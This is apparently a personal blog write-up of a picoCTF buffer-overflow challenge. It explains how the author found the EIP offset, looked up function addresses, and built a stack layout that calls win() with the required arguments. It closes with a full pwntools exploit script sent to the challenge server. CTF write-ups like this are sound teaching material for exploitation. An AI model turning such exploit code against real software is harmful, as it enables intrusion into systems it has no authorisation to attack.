---
title: "Buffer Overflow 2"
date: 2025-10-19T22:41:04+05:30
draft: False
---


This challenge was a classic example of how control flow can be hijacked when proper bounds checking is absent. Let’s break down the approach I used to solve it.


## Initial Analysis

After making the binary executable and reviewing the source, I found that it contained three key functions:

-   **main()** – program entry point.
    
-   **vuln()** – the vulnerable function that relies on unsafe input.
    
-   **win()** – the interesting one. It checks if two arguments equal `0xCAFEF00D` and `0xF00DF00D`. If both match, the flag is printed.
    
Running the binary we get something like this :
```
Please enter your string:
AAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAA
```
The binary basically echo-ed if anything was prompted in. Clearly, the goal was to redirect execution into `win()` while supplying the correct arguments. 



## Finding the Offset

The binary was vulnerable to a buffer overflow. To determine the exact overwrite point for EIP, I used GDB with **gef’s** pattern tools:

```
pattern create 200
pattern offset $eip

```

This revealed that the offset to EIP was **112 bytes**. That means after 112 characters, I have direct control over the instruction pointer.


## Identifying Useful Addresses

To craft the exploit, I needed the addresses of functions. Running `info functions` in GDB gave me what I needed.

The address of **main**:

```
0x08049372

```

The address of **win** could be extracted programmatically in Python with pwntools:

```python
f = ELF("./vuln")
f.symbols["win"]

```


## Why Jump to Main First?

At first glance, you might think it’s enough to overwrite EIP with the address of `win()`. But there’s a subtle detail here.

When a function returns, the CPU expects a return address to be on the stack. If you don’t provide a valid one, the program crashes right after executing `win()`. That’s why I placed the address of **main** immediately after **win**.

This way, when `win()` executes its own `ret`, it gracefully jumps back to main, keeping the program flow intact.


## Stack Layout with Arguments

Since `win()` expects two arguments, they need to be supplied on the stack right after the fake return address. On 32-bit x86, arguments are pushed onto the stack in order. So the final stack layout becomes:

```
[ return address -> win() ]
[ return address for win -> main() ]
[ argument 1 -> 0xCAFEF00D ]
[ argument 2 -> 0xF00DF00D ]

```

This ensures that when execution jumps into `win()`, the function receives exactly what it expects.


## Crafting the Payload

Here’s the payload broken down in Python:

```python
import pwn

f = pwn.ELF("./vuln")

jump_eip = pwn.p32(f.symbols["win"])     # overwrite EIP with win()
return_eip = pwn.p32(f.symbols["main"])  # fake return address
cafefood = pwn.p32(0xCAFEF00D)           # first argument
foodfood = pwn.p32(0xF00DF00D)           # second argument

payload = b''.join([
    b"A" * 112, 
    jump_eip, 
    return_eip, 
    cafefood, 
    foodfood
]) + b"\n"

with open("payload", "wb") as fl:
    fl.write(payload)

host = "saturn.picoctf.net"
port = 58846
conn = pwn.remote(host, port)
conn.sendline(payload)
print(conn.recvall().decode("latin-1"))
conn.close()

```


Running this exploit against the remote service redirected control to `win()`, satisfied the argument checks, and successfully revealed the flag. By combining offset calculation, function address lookup, and stack crafting, we were able to hijack control flow and cleanly call `win()` with the correct parameters.


